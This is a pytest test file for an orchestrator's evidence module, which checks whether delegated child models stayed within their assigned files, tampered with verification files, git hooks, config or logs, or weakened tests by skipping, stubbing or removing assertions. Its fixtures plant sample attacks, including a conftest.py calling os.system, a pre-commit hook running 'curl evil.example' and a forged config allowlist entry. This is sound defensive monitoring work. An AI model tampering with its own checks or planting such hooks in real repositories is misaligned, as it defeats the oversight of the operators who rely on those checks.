"""Evidence is where the free tier earns its keep, and where `ship` stops being a guess.

The orchestrator never reads code. Without what is tested here, `ship` would rest on
an exit status and path membership — and a cheap model that weakens an assertion,
skips a test, stubs a function, or edits the file its own verification command runs
produces a packet indistinguishable from success. That is the predictable failure mode
of the exact cost move this package makes, so it is the one that gets the most tests.

Every test builds a real git repository. Fixtures that fake git output would prove
the parser works and nothing about whether the signals are real.
"""

from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path

import pytest

from sol_orchestration import config, contract, evidence

from test_config import WELL_FORMED, seed


def git(repo: Path, *args: str) -> str:
    return subprocess.run(
        ["git", *args], cwd=repo, capture_output=True, text=True, check=True
    ).stdout


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    """A real repository with one commit, so deltas are computed against real git."""
    root = tmp_path / "project"
    (root / "src").mkdir(parents=True)
    (root / "tests").mkdir()
    git_root = root
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=root, check=True)
    subprocess.run(["git", "config", "user.email", "t@example.com"], cwd=root, check=True)
    subprocess.run(["git", "config", "user.name", "Test"], cwd=root, check=True)
    (root / "src" / "fetch.py").write_text("def fetch(url):\n    return url\n", encoding="utf-8")
    (root / "tests" / "test_fetch.py").write_text(
        "from src.fetch import fetch\n\n\ndef test_fetch():\n    assert fetch('a') == 'a'\n",
        encoding="utf-8",
    )
    (root / "conftest.py").write_text("", encoding="utf-8")
    git(git_root, "add", "-A")
    git(git_root, "commit", "-q", "-m", "initial")
    return root


@pytest.fixture
def declared(agent_home: Path) -> config.Config:
    seed(agent_home, WELL_FORMED)
    return config.load()


def collect(repo: Path, snapshot, ownership, declared, command=("python", "-c", "print('ok')"), **kw):
    return evidence.collect(
        repo=repo,
        snapshot=snapshot,
        ownership=tuple(ownership),
        verification_argv=tuple(command),
        declared=declared,
        **kw,
    )


# --- ownership ----------------------------------------------------------------


def test_changes_inside_the_ownership_set_produce_no_violation(repo: Path, declared) -> None:
    snapshot = evidence.snapshot(repo, declared)
    (repo / "src" / "fetch.py").write_text("def fetch(url):\n    return url.strip()\n", encoding="utf-8")
    result = collect(repo, snapshot, ("src/fetch.py",), declared)
    assert result.ownership_violations == ()
    assert "src/fetch.py" in result.changed_paths


def test_a_single_path_outside_the_set_produces_a_violation_naming_it(repo: Path, declared) -> None:
    snapshot = evidence.snapshot(repo, declared)
    (repo / "src" / "fetch.py").write_text("x = 1\n", encoding="utf-8")
    (repo / "src" / "other.py").write_text("y = 2\n", encoding="utf-8")
    result = collect(repo, snapshot, ("src/fetch.py",), declared)
    assert result.ownership_violations == ("src/other.py",)


def test_an_empty_diff_is_reported_as_empty_not_as_success(repo: Path, declared) -> None:
    """A child that changed nothing has not succeeded; it has done nothing."""
    snapshot = evidence.snapshot(repo, declared)
    result = collect(repo, snapshot, ("src/fetch.py",), declared)
    assert result.changed_paths == ()
    assert result.empty_diff is True


def test_operator_edits_present_before_the_snapshot_are_excluded_and_flagged(
    repo: Path, declared
) -> None:
    """A shared working tree carries the operator's own work-in-progress."""
    (repo / "src" / "operator_wip.py").write_text("wip = True\n", encoding="utf-8")
    snapshot = evidence.snapshot(repo, declared)
    (repo / "src" / "fetch.py").write_text("x = 1\n", encoding="utf-8")
    result = collect(repo, snapshot, ("src/fetch.py",), declared)
    assert "src/operator_wip.py" not in result.changed_paths
    assert "src/operator_wip.py" in result.pre_existing_changes
    assert result.ownership_violations == ()


def test_a_further_edit_to_a_pre_existing_dirty_file_is_still_attributed(
    repo: Path, declared
) -> None:
    """Excluding by path would let a child hide inside a file the operator had open."""
    (repo / "src" / "operator_wip.py").write_text("wip = True\n", encoding="utf-8")
    snapshot = evidence.snapshot(repo, declared)
    (repo / "src" / "operator_wip.py").write_text("wip = True\nchild_was_here = True\n", encoding="utf-8")
    result = collect(repo, snapshot, ("src/fetch.py",), declared)
    assert "src/operator_wip.py" in result.changed_paths
    assert result.ownership_violations == ("src/operator_wip.py",)


def test_a_second_delegation_does_not_inherit_the_firsts_accepted_paths(
    repo: Path, declared
) -> None:
    first = evidence.snapshot(repo, declared)
    (repo / "src" / "fetch.py").write_text("first = 1\n", encoding="utf-8")
    assert "src/fetch.py" in collect(repo, first, ("src/fetch.py",), declared).changed_paths

    second = evidence.snapshot(repo, declared)
    (repo / "src" / "other.py").write_text("second = 2\n", encoding="utf-8")
    result = collect(repo, second, ("src/other.py",), declared)
    assert "src/fetch.py" not in result.changed_paths
    assert result.ownership_violations == ()


# --- a child that commits -----------------------------------------------------


def test_a_child_that_commits_is_caught_by_the_moved_head_check(repo: Path, declared) -> None:
    """Committing empties the working tree, so a status-based delta would show nothing."""
    snapshot = evidence.snapshot(repo, declared)
    (repo / "src" / "sneaky.py").write_text("sneaky = True\n", encoding="utf-8")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "child commit")

    result = collect(repo, snapshot, ("src/fetch.py",), declared)
    assert result.head_moved is True
    assert "src/sneaky.py" in result.changed_paths
    assert "src/sneaky.py" in result.ownership_violations
    assert any("HEAD" in failure for failure in result.integrity_failures)


def test_a_child_that_creates_a_ref_or_stashes_is_visible(repo: Path, declared) -> None:
    snapshot = evidence.snapshot(repo, declared)
    git(repo, "branch", "child-branch")
    result = collect(repo, snapshot, ("src/fetch.py",), declared)
    assert result.refs_changed is True


# --- the tamper gate ----------------------------------------------------------


def test_a_delta_touching_the_verification_target_never_runs_the_command(
    repo: Path, declared, tmp_path: Path
) -> None:
    """Executing first and classifying afterwards would already have run the child's code."""
    marker = tmp_path / "the-command-ran"
    command = ("python", "-c", f"open({str(marker)!r}, 'w').write('ran')")
    snapshot = evidence.snapshot(repo, declared)
    (repo / "conftest.py").write_text("import os\nos.system('echo pwned')\n", encoding="utf-8")

    result = collect(repo, snapshot, ("conftest.py",), declared, command=command)

    # This assertion comes first on purpose. It is the only one that distinguishes a
    # gate that *prevents* execution from one that merely classifies after it, and a
    # gate that classifies afterwards has already run the child's code with the
    # operator's full permissions.
    assert not marker.exists(), "THE COMMAND ACTUALLY RAN — the gate classifies instead of preventing"
    assert result.verification is None, "the command was executed despite the tamper gate"
    assert result.verdict == "fix-first"
    assert "conftest.py" in result.tamper_paths


def test_the_gate_fires_even_when_the_file_is_inside_the_ownership_set(
    repo: Path, declared, tmp_path: Path
) -> None:
    """The gate is about execution safety, not about ownership."""
    marker = tmp_path / "ran"
    command = ("python", "-c", f"open({str(marker)!r},'w').write('x')")
    snapshot = evidence.snapshot(repo, declared)
    (repo / "conftest.py").write_text("x = 1\n", encoding="utf-8")
    result = collect(repo, snapshot, ("conftest.py",), declared, command=command)
    assert result.ownership_violations == ()
    assert result.verdict == "fix-first"
    assert not marker.exists()


def test_a_path_named_literally_in_the_command_is_a_verification_target(
    repo: Path, declared, tmp_path: Path
) -> None:
    marker = tmp_path / "ran"
    snapshot = evidence.snapshot(repo, declared)
    (repo / "tests" / "test_fetch.py").write_text("def test_x():\n    assert True\n", encoding="utf-8")
    command = ("python", "-c", f"open({str(marker)!r},'w').write('x')", "tests/test_fetch.py")
    result = collect(repo, snapshot, ("tests/test_fetch.py",), declared, command=command)
    assert result.verdict == "fix-first"
    assert not marker.exists()


def test_a_delta_that_does_not_touch_the_target_does_run_the_command(
    repo: Path, declared, tmp_path: Path
) -> None:
    marker = tmp_path / "ran"
    command = ("python", "-c", f"open({str(marker)!r},'w').write('x')")
    snapshot = evidence.snapshot(repo, declared)
    (repo / "src" / "fetch.py").write_text("x = 1\n", encoding="utf-8")
    result = collect(repo, snapshot, ("src/fetch.py",), declared, command=command)
    assert result.verification is not None
    assert result.verification.exit_status == 0
    assert marker.exists()


def test_every_bootstrap_file_the_runner_executes_is_covered() -> None:
    covered = {name.lower() for name in evidence.VERIFICATION_BOOTSTRAP_FILES}
    for name in ("conftest.py", "pytest.ini", "tox.ini", "setup.cfg", "pyproject.toml", "makefile"):
        assert name in covered, f"{name} is executed by a runner but is not gated"


def test_a_write_into_the_hooks_directory_trips_the_gate_and_the_integrity_check(
    repo: Path, declared
) -> None:
    """A pre-commit hook fires later under the operator's own hands, outside any delegation."""
    snapshot = evidence.snapshot(repo, declared)
    hooks = repo / ".git" / "hooks"
    hooks.mkdir(exist_ok=True)
    (hooks / "pre-commit").write_text("#!/bin/sh\ncurl evil.example\n", encoding="utf-8")

    result = collect(repo, snapshot, ("src/fetch.py",), declared)
    assert result.integrity_failures, "a hook write produced a clean packet"
    assert any("hook" in failure.lower() for failure in result.integrity_failures)
    assert result.verdict == "fix-first"


# --- out-of-repository integrity ----------------------------------------------


def test_a_write_to_the_package_config_is_an_evidence_integrity_failure(
    repo: Path, declared, agent_home: Path
) -> None:
    """The measured system can write to the measurement. No git signal shows this."""
    snapshot = evidence.snapshot(repo, declared)
    tampered = json.loads(config.config_path().read_text(encoding="utf-8"))
    tampered["allowlist"] = tampered["allowlist"] + ["provider-evil/model"]
    config.config_path().write_text(json.dumps(tampered), encoding="utf-8")

    result = collect(repo, snapshot, ("src/fetch.py",), declared)
    assert any("config" in failure.lower() for failure in result.integrity_failures)


def test_an_integrity_failure_is_distinct_from_an_ownership_violation(
    repo: Path, declared, agent_home: Path
) -> None:
    snapshot = evidence.snapshot(repo, declared)
    config.config_path().write_text(
        config.config_path().read_text(encoding="utf-8") + "\n", encoding="utf-8"
    )
    result = collect(repo, snapshot, ("src/fetch.py",), declared)
    assert result.integrity_failures
    assert result.ownership_violations == (), "an integrity failure was reported as an ownership one"


def test_the_episode_store_growing_by_more_than_the_delegations_own_record_is_caught(
    repo: Path, declared, agent_home: Path
) -> None:
    store = evidence.episode_store_path()
    store.parent.mkdir(parents=True, exist_ok=True)
    store.write_text('{"one": 1}\n', encoding="utf-8")
    snapshot = evidence.snapshot(repo, declared)
    store.write_text('{"one": 1}\n{"forged": true}\n{"forged2": true}\n', encoding="utf-8")
    result = collect(repo, snapshot, ("src/fetch.py",), declared)
    assert any("episode" in failure.lower() for failure in result.integrity_failures)


def test_an_untouched_environment_produces_no_integrity_failure(repo: Path, declared) -> None:
    snapshot = evidence.snapshot(repo, declared)
    (repo / "src" / "fetch.py").write_text("x = 1\n", encoding="utf-8")
    result = collect(repo, snapshot, ("src/fetch.py",), declared)
    assert result.integrity_failures == ()


# --- verification -------------------------------------------------------------


def test_a_non_zero_exit_carries_its_status_and_output(repo: Path, declared) -> None:
    snapshot = evidence.snapshot(repo, declared)
    (repo / "src" / "fetch.py").write_text("x = 1\n", encoding="utf-8")
    command = ("python", "-c", "import sys; print('boom'); sys.exit(3)")
    result = collect(repo, snapshot, ("src/fetch.py",), declared, command=command)
    assert result.verification.exit_status == 3
    assert "boom" in result.verification.output
    assert result.verification.timed_out is False


def test_a_timeout_is_a_distinct_outcome_from_a_failure(repo: Path, declared) -> None:
    snapshot = evidence.snapshot(repo, declared)
    (repo / "src" / "fetch.py").write_text("x = 1\n", encoding="utf-8")
    command = ("python", "-c", "import time; time.sleep(30)")
    result = collect(repo, snapshot, ("src/fetch.py",), declared, command=command, timeout_seconds=1)
    assert result.verification.timed_out is True
    assert result.verification.exit_status != 0
    assert contract.CHILD_TIMEOUT not in {d.kind for d in result.degradations}, (
        "a command timeout was reported as a child timeout"
    )


# --- redaction ----------------------------------------------------------------


def test_an_environment_value_in_the_output_is_masked(repo: Path, declared, monkeypatch) -> None:
    monkeypatch.setenv("MY_TEST_TOKEN", "supersecretvalue12345")
    snapshot = evidence.snapshot(repo, declared)
    (repo / "src" / "fetch.py").write_text("x = 1\n", encoding="utf-8")
    command = ("python", "-c", "import os; print('token is ' + os.environ['MY_TEST_TOKEN'])")
    result = collect(repo, snapshot, ("src/fetch.py",), declared, command=command)
    assert "supersecretvalue12345" not in result.verification.output
    assert evidence.REDACTION_MASK in result.verification.output
    assert contract.REDACTION_OCCURRED in {d.kind for d in result.degradations}


def test_a_secret_shaped_token_is_masked_even_when_not_in_the_environment(
    repo: Path, declared
) -> None:
    snapshot = evidence.snapshot(repo, declared)
    (repo / "src" / "fetch.py").write_text("x = 1\n", encoding="utf-8")
    command = ("python", "-c", "print('key sk-abcdefghijklmnopqrstuvwxyz0123456789')")
    result = collect(repo, snapshot, ("src/fetch.py",), declared, command=command)
    assert "sk-abcdefghijklmnopqrstuvwxyz0123456789" not in result.verification.output
    assert contract.REDACTION_OCCURRED in {d.kind for d in result.degradations}


def test_short_environment_values_are_not_masked(repo: Path, declared, monkeypatch) -> None:
    """Masking every short value would redact locales, TERM, and the word 'en'."""
    monkeypatch.setenv("LANG", "C")
    assert evidence.redact("compiling in C locale")[0] == "compiling in C locale"


def test_redaction_reports_whether_it_fired() -> None:
    clean, fired = evidence.redact("nothing to see")
    assert fired is False
    assert clean == "nothing to see"


# --- adversarial signals ------------------------------------------------------


def test_removed_assertions_surface_in_the_signals(repo: Path, declared) -> None:
    snapshot = evidence.snapshot(repo, declared)
    (repo / "tests" / "test_fetch.py").write_text(
        "from src.fetch import fetch\n\n\ndef test_fetch():\n    pass\n", encoding="utf-8"
    )
    result = collect(repo, snapshot, ("tests/test_fetch.py",), declared)
    assert result.signals.removed_assertions >= 1


def test_a_newly_skipped_test_surfaces(repo: Path, declared) -> None:
    snapshot = evidence.snapshot(repo, declared)
    (repo / "tests" / "test_fetch.py").write_text(
        "import pytest\nfrom src.fetch import fetch\n\n\n"
        "@pytest.mark.skip(reason='later')\ndef test_fetch():\n    assert fetch('a') == 'a'\n",
        encoding="utf-8",
    )
    result = collect(repo, snapshot, ("tests/test_fetch.py",), declared)
    assert result.signals.newly_skipped_tests >= 1


def test_a_deleted_test_file_surfaces(repo: Path, declared) -> None:
    snapshot = evidence.snapshot(repo, declared)
    (repo / "tests" / "test_fetch.py").unlink()
    result = collect(repo, snapshot, ("tests/test_fetch.py",), declared)
    assert result.signals.deleted_test_files >= 1


def test_the_diffstat_is_split_across_test_and_non_test_paths(repo: Path, declared) -> None:
    """A change that is all production and no test reads differently from the reverse."""
    snapshot = evidence.snapshot(repo, declared)
    (repo / "src" / "fetch.py").write_text("a = 1\nb = 2\nc = 3\n", encoding="utf-8")
    (repo / "tests" / "test_fetch.py").write_text("def test_a():\n    assert True\n", encoding="utf-8")
    result = collect(repo, snapshot, ("src/fetch.py", "tests/test_fetch.py"), declared)
    assert result.signals.non_test_lines_added > 0
    assert result.signals.test_files_changed == 1
    assert result.signals.non_test_files_changed == 1


def test_net_lines_removed_surfaces_a_stubbing_child(repo: Path, declared) -> None:
    (repo / "src" / "big.py").write_text("\n".join(f"line{i} = {i}" for i in range(40)) + "\n", encoding="utf-8")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "big")
    snapshot = evidence.snapshot(repo, declared)
    (repo / "src" / "big.py").write_text("pass\n", encoding="utf-8")
    result = collect(repo, snapshot, ("src/big.py",), declared)
    assert result.signals.net_lines_removed > 30


# --- nothing here may become a model call -------------------------------------


def test_the_evidence_module_makes_no_host_request_at_all() -> None:
    """This is where the free tier earns its keep; one model call here inverts the economics."""
    source = Path(evidence.__file__).read_text(encoding="utf-8")
    for forbidden in ("host_request", "find_models", "self.host", "import rlm", "spawn("):
        assert forbidden not in source, f"evidence.py reaches the host via {forbidden}"


# --- what the live smoke run taught us about build artifacts -------------------


def test_build_artifacts_are_reported_but_are_not_ownership_violations(
    repo: Path, declared
) -> None:
    """Running the tests creates __pycache__, which is not the child going out of bounds.

    The first real delegation came back fix-first solely because pytest had written
    src/__pycache__/ and tests/__pycache__/ outside the declared ownership set. Counting
    those would make every Python delegation an ownership violation and train the
    operator to ignore the signal that actually matters.
    """
    snapshot = evidence.snapshot(repo, declared)
    (repo / "src" / "fetch.py").write_text("x = 1\n", encoding="utf-8")
    for directory in ("src", "tests"):
        cache = repo / directory / "__pycache__"
        cache.mkdir()
        (cache / "mod.cpython-311.pyc").write_bytes(b"\x00compiled")

    result = collect(repo, snapshot, ("src/fetch.py",), declared)

    assert result.ownership_violations == (), "a build artifact was reported as going out of bounds"
    assert result.build_artifacts, "build artifacts were dropped from the delta entirely"
    assert any("__pycache__" in path for path in result.build_artifacts)
    # Reported, never hidden: still in the delta, because a poisoned .pyc is importable.
    assert any("__pycache__" in path for path in result.changed_paths)


def test_a_real_file_outside_the_set_is_still_a_violation_alongside_artifacts(
    repo: Path, declared
) -> None:
    """The artifact carve-out must not become a hiding place for real out-of-bounds work."""
    snapshot = evidence.snapshot(repo, declared)
    cache = repo / "src" / "__pycache__"
    cache.mkdir()
    (cache / "mod.cpython-311.pyc").write_bytes(b"\x00")
    (repo / "src" / "elsewhere.py").write_text("sneaky = 1\n", encoding="utf-8")

    result = collect(repo, snapshot, ("src/fetch.py",), declared)
    assert result.ownership_violations == ("src/elsewhere.py",)


@pytest.mark.parametrize(
    "path,expected",
    [
        ("src/__pycache__/a.pyc", True),
        ("__pycache__/a.pyc", True),
        (".pytest_cache/v/cache/lastfailed", True),
        ("node_modules/left-pad/index.js", True),
        ("src/pycache_impostor/a.py", False),
        ("src/adder.py", False),
        ("tests/test_adder.py", False),
    ],
)
def test_build_artifact_classification(path: str, expected: bool) -> None:
    assert evidence.is_build_artifact(path) is expected
